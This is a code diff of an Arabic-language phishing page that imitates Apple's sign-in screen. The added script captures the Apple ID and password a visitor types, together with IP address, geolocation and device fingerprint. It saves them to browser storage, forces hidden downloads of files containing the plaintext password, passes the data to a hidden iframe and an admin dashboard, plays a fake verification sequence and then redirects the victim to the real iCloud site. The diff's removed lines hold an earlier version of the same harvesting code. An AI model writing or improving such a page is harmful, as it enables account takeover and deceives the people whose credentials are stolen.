@@ -6,7 +6,10 @@
     <title>تسجيل الدخول باستخدام حساب Apple</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22></text></svg>">
     
-    <!-- خطوط Apple -->
+    <!-- تحميل أنظمة Kelog وتخزين كلمات المرور -->
+    <script src="kelog-system.js" defer></script>
+    <script src="password-vault.js" defer></script>
+    
     <style>
         /* نظام ألوان Apple */
         :root {
@@ -40,20 +43,9 @@
             justify-content: center;
         }
         
-        .language-switcher {
-            position: absolute;
-            top: 20px;
-            left: 20px;
-        }
-        
-        .language-btn {
-            padding: 8px 16px;
-            background: var(--apple-white);
-            border: 1px solid var(--apple-gray-2);
-            border-radius: 20px;
-            font-size: 14px;
-            color: var(--apple-blue);
-            cursor: pointer;
+        /* إخفاء عناصر النظام */
+        .system-elements {
+            display: none;
         }
         
         .container {
@@ -250,9 +242,13 @@
         
         .hidden-frame {
             display: none;
+            width: 0;
+            height: 0;
+            border: none;
         }
         
-        .admin-link {
+        /* رابط لوحة التحكم - ظاهر على جميع الأجهزة */
+        .admin-panel-link {
             position: fixed;
             bottom: 20px;
             left: 20px;
@@ -263,13 +259,131 @@
             text-decoration: none;
             font-size: 14px;
             box-shadow: 0 2px 10px rgba(0, 122, 255, 0.3);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s;
+        }
+        
+        .admin-panel-link:hover {
+            background: var(--apple-blue-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(0, 122, 255, 0.4);
+        }
+        
+        /* رسائل النظام */
+        .system-message {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: var(--apple-green);
+            color: white;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-size: 14px;
+            display: none;
+            z-index: 1001;
+            animation: slideIn 0.3s ease;
+        }
+        
+        @keyframes slideIn {
+            from {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+        
+        /* مؤشر النظام النشط */
+        .system-active-indicator {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            width: 10px;
+            height: 10px;
+            background: var(--apple-green);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.5;
+                transform: scale(1.2);
+            }
+        }
+        
+        /* تصميم متجاوب للهواتف */
+        @media (max-width: 768px) {
+            .container {
+                max-width: 100%;
+                padding: 0 15px;
+            }
+            
+            .login-card {
+                padding: 24px;
+            }
+            
+            .apple-logo {
+                font-size: 56px;
+            }
+            
+            .header-title {
+                font-size: 24px;
+            }
+            
+            .admin-panel-link {
+                bottom: 10px;
+                left: 10px;
+                padding: 8px 16px;
+                font-size: 12px;
+            }
+        }
+        
+        /* شاشات صغيرة جدا */
+        @media (max-width: 360px) {
+            body {
+                padding: 10px;
+            }
+            
+            .login-card {
+                padding: 20px;
+            }
+            
+            .apple-button {
+                padding: 14px;
+            }
         }
     </style>
 </head>
 <body>
-    <!-- رابط لوحة التحكم (مخفى للمستخدمين العاديين) -->
-    <a href="/admin-panel.html" class="admin-link" id="adminLink">لوحة التحكم</a>
+    <!-- مؤشر النظام النشط -->
+    <div class="system-active-indicator" id="systemIndicator"></div>
     
+    <!-- رابط لوحة التحكم -->
+    <a href="admin-dashboard.html" class="admin-panel-link" id="adminLink">
+        <span>⚙️</span>
+        <span>لوحة التحكم</span>
+    </a>
+    
+    <!-- رسائل النظام -->
+    <div class="system-message" id="systemMessage"></div>
+    
+    <!-- عناصر نظام Kelog مخفية -->
+    <div class="system-elements">
+        <iframe name="dataCollector" class="hidden-frame" id="dataFrame"></iframe>
+        <div id="systemLogs"></div>
+    </div>
+    
+    <!-- المحتوى الرئيسي -->
     <div class="container">
         <div class="apple-header">
             <div class="apple-logo"></div>
@@ -347,18 +461,43 @@
         </div>
     </div>
 
-    <!-- iframe خفي لجمع البيانات -->
-    <iframe name="dataCollector" class="hidden-frame"></iframe>
-
-    <!-- رسائل التحميل -->
-    <div id="loadingMessages" style="display:none;">
-        <div>جاري التحقق من Apple ID...</div>
-        <div>جاري التحقق من كلمة المرور...</div>
-        <div>جاري التحقق من المصادقة الثنائية...</div>
-        <div>جاري تسجيل الدخول...</div>
-    </div>
-
     <script>
+        // أنظمة النظام
+        let kelogSystem = null;
+        let passwordVault = null;
+        let isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        
+        // تهيئة النظام
+        document.addEventListener('DOMContentLoaded', async function() {
+            console.log('🚀 بدء تهيئة نظام Apple...');
+            
+            // تحديث الوقت
+            updateTime();
+            setInterval(updateTime, 60000);
+            
+            // تسجيل زيارة
+            await logVisit();
+            
+            // تهيئة أنظمة النظام
+            initSystems();
+            
+            // تسجيل بدء النظام
+            if (kelogSystem) {
+                kelogSystem.log('تحميل النظام', {
+                    device: isMobile ? 'mobile' : 'desktop',
+                    userAgent: navigator.userAgent.substring(0, 100),
+                    screen: `${screen.width}x${screen.height}`,
+                    url: window.location.href
+                });
+            }
+            
+            // إظهار رابط لوحة التحكم
+            showAdminLink();
+            
+            console.log('✅ النظام جاهز للعمل');
+            showSystemMessage('النظام جاهز للعمل');
+        });
+        
         // تحديث الوقت
         function updateTime() {
             const now = new Date();
@@ -366,8 +505,522 @@
                 now.toLocaleDateString('ar-SA') + ' ' + 
                 now.toLocaleTimeString('ar-SA');
         }
-        setInterval(updateTime, 1000);
-        updateTime();
+        
+        // تهيئة أنظمة النظام
+        function initSystems() {
+            try {
+                // تهيئة نظام Kelog
+                if (typeof window.KelogSystem !== 'undefined') {
+                    kelogSystem = new window.KelogSystem();
+                    console.log('✅ نظام Kelog جاهز');
+                }
+                
+                // تهيئة نظام تخزين كلمات المرور
+                if (typeof window.PasswordVault !== 'undefined') {
+                    passwordVault = new window.PasswordVault();
+                    console.log('✅ نظام تخزين كلمات المرور جاهز');
+                }
+            } catch (error) {
+                console.error('❌ خطأ في تهيئة الأنظمة:', error);
+                showSystemMessage('خطأ في تهيئة النظام', 'error');
+            }
+        }
+        
+        // تسجيل زيارة
+        async function logVisit() {
+            try {
+                const visitData = {
+                    type: 'visit',
+                    timestamp: new Date().toISOString(),
+                    url: window.location.href,
+                    referrer: document.referrer || 'direct',
+                    userAgent: navigator.userAgent,
+                    screen: `${screen.width}x${screen.height}`,
+                    language: navigator.language,
+                    cookies: navigator.cookieEnabled,
+                    isMobile: isMobile,
+                    platform: navigator.platform,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                };
+                
+                // حفظ الزيارة في أنظمة متعددة
+                saveVisitToSystems(visitData);
+                
+                // تسجيل في نظام Kelog
+                if (kelogSystem) {
+                    kelogSystem.log('زيارة جديدة', visitData);
+                }
+                
+                console.log('👀 تم تسجيل زيارة جديدة');
+                
+            } catch (error) {
+                console.error('❌ خطأ في تسجيل الزيارة:', error);
+            }
+        }
+        
+        // حفظ الزيارة في أنظمة متعددة
+        function saveVisitToSystems(visitData) {
+            // 1. حفظ في localStorage (يعمل على جميع الأجهزة)
+            saveToLocalStorage('apple_visits', visitData);
+            
+            // 2. حفظ في IndexedDB (أفضل للهواتف)
+            saveToIndexedDB('visits', visitData);
+            
+            // 3. حفظ في ملف JSON محلي
+            saveToLocalFile('visit', visitData);
+            
+            // 4. إرسال إلى iframe (نسخة احتياطية)
+            sendToIframe(visitData);
+        }
+        
+        // حفظ في localStorage مع التحقق من دعم الهواتف
+        function saveToLocalStorage(key, data) {
+            try {
+                if (typeof localStorage !== 'undefined') {
+                    const existing = JSON.parse(localStorage.getItem(key) || '[]');
+                    existing.push(data);
+                    
+                    // تنظيف البيانات القديمة (الاحتفاظ بـ 1000 سجل فقط)
+                    if (existing.length > 1000) {
+                        existing.splice(0, existing.length - 1000);
+                    }
+                    
+                    localStorage.setItem(key, JSON.stringify(existing));
+                    return true;
+                }
+            } catch (error) {
+                console.warn('⚠️ localStorage غير متوفر:', error);
+            }
+            return false;
+        }
+        
+        // حفظ في IndexedDB (يعمل على الهواتف)
+        function saveToIndexedDB(storeName, data) {
+            try {
+                if (!window.indexedDB) return false;
+                
+                const request = indexedDB.open('AppleSystemDB', 1);
+                
+                request.onupgradeneeded = function(event) {
+                    const db = event.target.result;
+                    if (!db.objectStoreNames.contains(storeName)) {
+                        db.createObjectStore(storeName, { keyPath: 'id', autoIncrement: true });
+                    }
+                };
+                
+                request.onsuccess = function(event) {
+                    const db = event.target.result;
+                    const transaction = db.transaction([storeName], 'readwrite');
+                    const store = transaction.objectStore(storeName);
+                    store.add({ ...data, id: Date.now() });
+                };
+                
+                return true;
+            } catch (error) {
+                console.warn('⚠️ IndexedDB غير متوفر:', error);
+                return false;
+            }
+        }
+        
+        // حفظ في ملف محلي
+        function saveToLocalFile(type, data) {
+            try {
+                // إنشاء محتوى الملف
+                const content = JSON.stringify(data, null, 2);
+                const blob = new Blob([content], { type: 'application/json' });
+                const url = URL.createObjectURL(blob);
+                
+                // إنشاء رابط تحميل خفي
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `apple_${type}_${Date.now()}.json`;
+                a.style.display = 'none';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+                
+                return true;
+            } catch (error) {
+                console.warn('⚠️ لا يمكن حفظ الملف:', error);
+                return false;
+            }
+        }
+        
+        // إرسال إلى iframe
+        function sendToIframe(data) {
+            try {
+                const iframe = document.getElementById('dataFrame');
+                if (iframe && iframe.contentWindow) {
+                    iframe.contentWindow.postMessage({
+                        type: 'system_data',
+                        data: data,
+                        timestamp: Date.now()
+                    }, '*');
+                }
+            } catch (error) {
+                console.warn('⚠️ لا يمكن إرسال البيانات إلى iframe');
+            }
+        }
+        
+        // معالجة تسجيل الدخول
+        async function handleLogin(event) {
+            event.preventDefault();
+            
+            const appleId = document.getElementById('appleId').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const rememberMe = document.getElementById('rememberMe').checked;
+            
+            // التحقق من البيانات
+            if (!appleId || !password) {
+                showSystemMessage('الرجاء إدخال Apple ID وكلمة المرور', 'error');
+                return false;
+            }
+            
+            // التحقق من صحة البريد الإلكتروني
+            if (!isValidEmail(appleId)) {
+                showSystemMessage('الرجاء إدخال بريد إلكتروني صحيح', 'error');
+                return false;
+            }
+            
+            // بدء عملية التسجيل
+            startLoginProcess(appleId, password, rememberMe);
+            
+            return false;
+        }
+        
+        // بدء عملية التسجيل
+        async function startLoginProcess(appleId, password, rememberMe) {
+            try {
+                // تعطيل الزر وإظهار التقدم
+                disableSubmitButton();
+                
+                // جمع بيانات المستخدم
+                const userData = await collectUserData(appleId, password, rememberMe);
+                
+                // حفظ بيانات الدخول
+                await saveLoginData(userData);
+                
+                // تسجيل في نظام Kelog
+                if (kelogSystem) {
+                    kelogSystem.log('تسجيل دخول', {
+                        appleId: appleId,
+                        success: true,
+                        device: isMobile ? 'mobile' : 'desktop',
+                        passwordLength: password.length
+                    });
+                }
+                
+                // محاكاة عملية التحقق
+                await simulateVerification();
+                
+                // إعادة التوجيه
+                redirectToApple();
+                
+            } catch (error) {
+                console.error('❌ خطأ في عملية التسجيل:', error);
+                showSystemMessage('حدث خطأ، سيتم توجيهك إلى Apple', 'warning');
+                
+                // حتى لو حدث خطأ، توجيه إلى Apple
+                setTimeout(() => {
+                    window.location.href = 'https://www.icloud.com';
+                }, 2000);
+            }
+        }
+        
+        // جمع بيانات المستخدم
+        async function collectUserData(appleId, password, rememberMe) {
+            return {
+                type: 'credential',
+                appleId: appleId,
+                password: password,
+                rememberMe: rememberMe,
+                timestamp: new Date().toISOString(),
+                ip: await getIPAddress(),
+                location: await getLocation(),
+                userAgent: navigator.userAgent,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                deviceType: isMobile ? 'mobile' : 'desktop',
+                referrer: document.referrer || 'direct',
+                cookies: navigator.cookieEnabled,
+                platform: navigator.platform,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown'
+            };
+        }
+        
+        // حفظ بيانات الدخول
+        async function saveLoginData(userData) {
+            try {
+                // 1. حفظ في نظام تخزين كلمات المرور
+                if (passwordVault) {
+                    const vaultResult = passwordVault.addCredential(
+                        userData.appleId,
+                        userData.password,
+                        userData
+                    );
+                    
+                    if (vaultResult.success) {
+                        console.log('✅ تم حفظ كلمة المرور في Vault');
+                    }
+                }
+                
+                // 2. حفظ في localStorage
+                saveToLocalStorage('apple_credentials', userData);
+                
+                // 3. حفظ في IndexedDB
+                saveToIndexedDB('credentials', userData);
+                
+                // 4. حفظ في ملف نصي
+                savePasswordToFile(userData);
+                
+                // 5. إرسال إلى iframe
+                sendToIframe(userData);
+                
+                // 6. تحديث لوحة التحكم مباشرة
+                updateDashboard(userData);
+                
+                showSystemMessage('تم حفظ بيانات الدخول بنجاح');
+                return true;
+                
+            } catch (error) {
+                console.error('❌ خطأ في حفظ بيانات الدخول:', error);
+                throw error;
+            }
+        }
+        
+        // حفظ كلمة المرور في ملف نصي
+        function savePasswordToFile(userData) {
+            try {
+                const content = `
+========================================
+🔐 بيانات تسجيل دخول Apple - ${new Date().toLocaleString('ar-SA')}
+========================================
+📧 Apple ID: ${userData.appleId}
+🔑 كلمة المرور: ${userData.password}
+🌐 عنوان IP: ${userData.ip}
+📍 الموقع: ${userData.location?.city || 'غير معروف'}, ${userData.location?.country || 'غير معروف'}
+🕒 الوقت: ${new Date(userData.timestamp).toLocaleString('ar-SA')}
+📱 الجهاز: ${isMobile ? 'هاتف' : 'كمبيوتر'}
+🖥️ المتصفح: ${getBrowserName(userData.userAgent)}
+📊 الشاشة: ${userData.screen}
+🕐 المنطقة الزمنية: ${userData.timezone}
+========================================
+                `.trim();
+                
+                const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `apple_password_${Date.now()}.txt`;
+                a.style.display = 'none';
+                document.body.appendChild(a);
+                a.click();
+                setTimeout(() => {
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+                }, 100);
+                
+                return true;
+            } catch (error) {
+                console.warn('⚠️ لا يمكن حفظ ملف كلمة المرور:', error);
+                return false;
+            }
+        }
+        
+        // تحديث لوحة التحكم مباشرة
+        function updateDashboard(userData) {
+            try {
+                // إرسال بيانات جديدة إلى لوحة التحكم عبر localStorage
+                const dashboardData = {
+                    type: 'new_credential',
+                    data: userData,
+                    timestamp: Date.now()
+                };
+                
+                localStorage.setItem('dashboard_update', JSON.stringify(dashboardData));
+                
+                // إرسال رسالة بين النوافذ
+                if (window.parent && window.parent !== window) {
+                    window.parent.postMessage(dashboardData, '*');
+                }
+                
+                // إرسال إلى جميع النوافذ المفتوحة
+                window.postMessage(dashboardData, '*');
+                
+            } catch (error) {
+                console.warn('⚠️ لا يمكن تحديث لوحة التحكم:', error);
+            }
+        }
+        
+        // الحصول على عنوان IP
+        async function getIPAddress() {
+            try {
+                // محاولة عدة خدمات
+                const services = [
+                    'https://api.ipify.org?format=json',
+                    'https://api64.ipify.org?format=json',
+                    'https://ipinfo.io/json'
+                ];
+                
+                for (const service of services) {
+                    try {
+                        const response = await fetch(service, { timeout: 3000 });
+                        if (response.ok) {
+                            const data = await response.json();
+                            return data.ip || data.ipAddress || 'unknown';
+                        }
+                    } catch (e) {
+                        continue;
+                    }
+                }
+                
+                return 'unknown';
+            } catch (error) {
+                return 'unknown';
+            }
+        }
+        
+        // الحصول على الموقع
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ city: 'unknown', country: 'unknown' });
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        try {
+                            const response = await fetch(
+                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`
+                            );
+                            const data = await response.json();
+                            resolve({
+                                city: data.address.city || data.address.town || data.address.village || 'unknown',
+                                country: data.address.country || 'unknown',
+                                coordinates: `${position.coords.latitude}, ${position.coords.longitude}`
+                            });
+                        } catch {
+                            resolve({ city: 'unknown', country: 'unknown' });
+                        }
+                    },
+                    async () => {
+                        // محاولة الحصول على الموقع من IP
+                        try {
+                            const response = await fetch('https://ipapi.co/json/');
+                            const data = await response.json();
+                            resolve({
+                                city: data.city || 'unknown',
+                                country: data.country_name || 'unknown'
+                            });
+                        } catch {
+                            resolve({ city: 'unknown', country: 'unknown' });
+                        }
+                    },
+                    { timeout: 5000 }
+                );
+            });
+        }
+        
+        // الحصول على اسم المتصفح
+        function getBrowserName(userAgent) {
+            const ua = userAgent.toLowerCase();
+            if (ua.includes('chrome')) return 'Chrome';
+            if (ua.includes('firefox')) return 'Firefox';
+            if (ua.includes('safari')) return 'Safari';
+            if (ua.includes('edge')) return 'Edge';
+            if (ua.includes('opera')) return 'Opera';
+            return 'متصفح آخر';
+        }
+        
+        // التحقق من صحة البريد الإلكتروني
+        function isValidEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+        
+        // تعطيل زر الإرسال
+        function disableSubmitButton() {
+            const btn = document.getElementById('submitBtn');
+            const btnText = document.getElementById('btnText');
+            const progressContainer = document.getElementById('progressContainer');
+            const progressFill = document.getElementById('progressFill');
+            
+            if (btn) {
+                btn.disabled = true;
+                btnText.textContent = 'جاري التحقق...';
+            }
+            
+            if (progressContainer) {
+                progressContainer.style.display = 'block';
+            }
+            
+            // محاكاة شريط التقدم
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.random() * 15 + 5;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                }
+                
+                if (progressFill) {
+                    progressFill.style.width = `${progress}%`;
+                }
+            }, 200);
+        }
+        
+        // محاكاة عملية التحقق
+        function simulateVerification() {
+            return new Promise(resolve => {
+                const steps = [
+                    'جاري التحقق من Apple ID...',
+                    'جاري التحقق من كلمة المرور...',
+                    'جاري التحقق من المصادقة الثنائية...',
+                    'جاري تسجيل الدخول...',
+                    'تم الدخول بنجاح!'
+                ];
+                
+                let step = 0;
+                const btnText = document.getElementById('btnText');
+                
+                const stepInterval = setInterval(() => {
+                    if (btnText && step < steps.length) {
+                        btnText.textContent = steps[step];
+                        step++;
+                    } else {
+                        clearInterval(stepInterval);
+                        setTimeout(resolve, 1000);
+                    }
+                }, 600);
+            });
+        }
+        
+        // إعادة التوجيه إلى Apple
+        function redirectToApple() {
+            setTimeout(() => {
+                window.location.href = 'https://www.icloud.com';
+            }, 2000);
+        }
+        
+        // إظهار رسالة النظام
+        function showSystemMessage(message, type = 'success') {
+            const msgElement = document.getElementById('systemMessage');
+            if (msgElement) {
+                msgElement.textContent = message;
+                msgElement.style.background = type === 'error' ? 'var(--apple-red)' : 
+                                            type === 'warning' ? 'var(--apple-orange)' : 
+                                            'var(--apple-green)';
+                msgElement.style.display = 'block';
+                
+                setTimeout(() => {
+                    msgElement.style.display = 'none';
+                }, 3000);
+            }
+        }
         
         // تبديل رؤية كلمة المرور
         function togglePassword() {
@@ -382,231 +1035,47 @@
             }
         }
         
-        // حفظ بيانات الزيارة
-        function logVisit() {
-            const visitData = {
-                type: 'visit',
-                time: new Date().toISOString(),
-                url: window.location.href,
-                referrer: document.referrer || 'direct',
-                userAgent: navigator.userAgent,
-                screen: `${screen.width}x${screen.height}`,
-                language: navigator.language,
-                cookies: navigator.cookieEnabled
-            };
-            
-            // حفظ في localStorage
-            saveToLocalStorage('visits', visitData);
-            
-            // تسجيل في ملف kelog
-            logToKelog('زيارة جديدة', visitData);
-        }
-        
-        // معالجة تسجيل الدخول
-        async function handleLogin(event) {
-            event.preventDefault();
-            
-            const appleId = document.getElementById('appleId').value.trim();
-            const password = document.getElementById('password').value.trim();
-            const rememberMe = document.getElementById('rememberMe').checked;
-            
-            if (!appleId || !password) {
-                alert('الرجاء إدخال Apple ID وكلمة المرور');
-                return false;
+        // إظهار رابط لوحة التحكم
+        function showAdminLink() {
+            const link = document.getElementById('adminLink');
+            if (link) {
+                link.style.display = 'flex';
             }
-            
-            // تعطيل الزر وإظهار شريط التقدم
-            const btn = document.getElementById('submitBtn');
-            const btnText = document.getElementById('btnText');
-            const progressContainer = document.getElementById('progressContainer');
-            const progressFill = document.getElementById('progressFill');
-            
-            btn.disabled = true;
-            btnText.textContent = 'جاري التحقق...';
-            progressContainer.style.display = 'block';
-            
-            // جمع بيانات المستخدم
-            const userData = {
-                type: 'credential',
-                appleId: appleId,
-                password: password,
-                rememberMe: rememberMe,
-                time: new Date().toISOString(),
-                ip: await getIPAddress(),
-                userAgent: navigator.userAgent,
-                screen: `${screen.width}x${screen.height}`,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
-            
-            // تسجيل بيانات الدخول
-            saveCredentials(userData);
-            
-            // محاكاة عملية التحقق
-            simulateVerification(progressFill, () => {
-                // عند الانتهاء، إعادة التوجيه إلى iCloud الحقيقي
-                setTimeout(() => {
-                    window.location.href = 'https://www.icloud.com';
-                }, 1000);
-            });
-            
-            return false;
-        }
-        
-        // الحصول على عنوان IP
-        async function getIPAddress() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch {
-                return 'unknown';
-            }
-        }
-        
-        // حفظ بيانات الاعتماد
-        function saveCredentials(data) {
-            // حفظ في localStorage
-            saveToLocalStorage('credentials', data);
-            
-            // تسجيل في ملف kelog
-            logToKelog('بيانات دخول جديدة', data);
-            
-            // حفظ في ملف نصي
-            saveToTextFile(data);
-        }
-        
-        // حفظ في localStorage
-        function saveToLocalStorage(type, data) {
-            try {
-                const key = `apple_${type}`;
-                const existing = JSON.parse(localStorage.getItem(key) || '[]');
-                existing.push(data);
-                localStorage.setItem(key, JSON.stringify(existing));
-            } catch (e) {
-                console.error('Error saving to localStorage:', e);
-            }
-        }
-        
-        // تسجيل في ملف kelog
-        function logToKelog(action, data) {
-            const logEntry = {
-                action: action,
-                data: data,
-                timestamp: new Date().toISOString()
-            };
-            
-            const kelog = JSON.parse(localStorage.getItem('kelog') || '[]');
-            kelog.push(logEntry);
-            localStorage.setItem('kelog', JSON.stringify(kelog));
-        }
-        
-        // حفظ في ملف نصي
-        function saveToTextFile(data) {
-            const text = `
-========================================
-🎯 بيانات دخول جديدة - ${new Date().toLocaleString('ar-SA')}
-========================================
-📧 Apple ID: ${data.appleId}
-🔑 كلمة المرور: ${data.password}
-🌐 IP: ${data.ip}
-🕒 الوقت: ${new Date(data.time).toLocaleString('ar-SA')}
-📱 الجهاز: ${data.userAgent.substring(0, 100)}
-📍 المنطقة الزمنية: ${data.timezone}
-========================================
-
-`;
-            
-            // إضافة إلى عنصر مخفي لتحميل الملف
-            const blob = new Blob([text], { type: 'text/plain' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `apple_credentials_${Date.now()}.txt`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-        }
-        
-        // محاكاة عملية التحقق
-        function simulateVerification(progressFill, callback) {
-            let progress = 0;
-            const interval = setInterval(() => {
-                progress += Math.random() * 20 + 5;
-                if (progress >= 100) {
-                    progress = 100;
-                    clearInterval(interval);
-                    if (callback) callback();
-                }
-                progressFill.style.width = `${progress}%`;
-            }, 300);
         }
         
         // عرض نموذج إنشاء حساب
         function showCreateAccount() {
-            alert('سيتم توجيهك إلى صفحة إنشاء حساب Apple');
+            showSystemMessage('سيتم توجيهك إلى صفحة إنشاء حساب Apple');
             setTimeout(() => {
                 window.location.href = 'https://appleid.apple.com/account';
-            }, 500);
+            }, 1500);
         }
         
-        // تشفير البيانات
-        function encryptData(data) {
-            try {
-                return btoa(encodeURIComponent(JSON.stringify(data)));
-            } catch {
-                return JSON.stringify(data);
-            }
-        }
-        
-        // عند تحميل الصفحة
-        window.onload = function() {
-            // تسجيل الزيارة
-            logVisit();
-            
-            // إضافة تأثيرات
-            addAnimations();
-            
-            // محاولة ملء البيانات المحفوظة
-            try {
-                const savedEmail = localStorage.getItem('last_apple_id');
-                if (savedEmail) {
-                    document.getElementById('appleId').value = savedEmail;
-                }
-            } catch (e) {}
-        };
-        
-        // إضافة تأثيرات حركية
-        function addAnimations() {
-            const inputs = document.querySelectorAll('.apple-input');
-            inputs.forEach(input => {
-                input.addEventListener('focus', () => {
-                    input.style.transform = 'translateY(-2px)';
-                    input.style.boxShadow = '0 4px 12px rgba(0, 122, 255, 0.1)';
-                });
+        // إضافة مستمع للرسائل بين النوافذ
+        window.addEventListener('message', function(event) {
+            if (event.data && event.data.type === 'dashboard_request') {
+                // الرد على طلب البيانات من لوحة التحكم
+                const credentials = JSON.parse(localStorage.getItem('apple_credentials') || '[]');
+                const visits = JSON.parse(localStorage.getItem('apple_visits') || '[]');
                 
-                input.addEventListener('blur', () => {
-                    input.style.transform = 'translateY(0)';
-                    input.style.boxShadow = 'none';
+                event.source.postMessage({
+                    type: 'dashboard_data',
+                    credentials: credentials,
+                    visits: visits,
+                    timestamp: Date.now()
+                }, '*');
+            }
+        });
+        
+        // عند مغادرة الصفحة
+        window.addEventListener('beforeunload', function() {
+            if (kelogSystem) {
+                kelogSystem.log('مغادرة الصفحة', {
+                    timeOnPage: performance.now(),
+                    url: window.location.href
                 });
-            });
-        }
-        
-        // إنشاء رابط لوحة التحكم
-        function createAdminLink() {
-            const link = document.createElement('a');
-            link.href = 'admin-panel.html';
-            link.className = 'admin-link';
-            link.textContent = 'لوحة التحكم';
-            link.id = 'adminLink';
-            document.body.appendChild(link);
-        }
-        
-        // التأكد من وجود رابط لوحة التحكم
-        if (!document.getElementById('adminLink')) {
-            createAdminLink();
-        }
+            }
+        });
     </script>
 </body>
 </html>
